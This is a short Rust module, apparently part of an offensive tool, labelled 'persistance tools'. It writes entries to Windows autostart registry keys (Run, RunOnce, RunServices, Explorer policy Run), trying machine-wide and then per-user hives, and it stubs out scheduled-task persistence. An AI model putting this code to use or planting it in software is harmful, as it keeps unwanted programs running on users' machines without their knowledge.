/*
    All the persistance tools
 */
use super::tools;
use winreg::enums::{HKEY_LOCAL_MACHINE,HKEY_CURRENT_USER};


/* Registry write */
fn set_key_local_or_user(path: &str, key: &str,value: &str) -> bool{
    if tools::set_reg_str(HKEY_LOCAL_MACHINE,path,key,value){
        return true
    }
    if tools::set_reg_str(HKEY_CURRENT_USER,path,key,value){
        return true
    }
    return false
}
pub enum CurrentVersionKey { Run, RunOnce, RunOnceEx , RunServices, RunServicesOnce, Explorer}

pub struct Registry {
    name: String,
    value: String,
}

impl Registry {
    pub fn new(key_name:&str,key_value:&str) -> Self {
        Self {name: key_name.to_string(), value: key_value.to_string()}
    }

    pub fn set_run_key(&self,root: CurrentVersionKey) -> bool{
        let root = match root{
            CurrentVersionKey::Run =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            CurrentVersionKey::RunOnce =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            CurrentVersionKey::RunOnceEx =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001",
            CurrentVersionKey::RunServices =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
            CurrentVersionKey::RunServicesOnce =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
            CurrentVersionKey::Explorer =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        };
        set_key_local_or_user(root,&self.name,&self.value)
    }
}





pub enum ScheduledTasks {Cmd, Powershell}

impl ScheduledTasks {
    
}


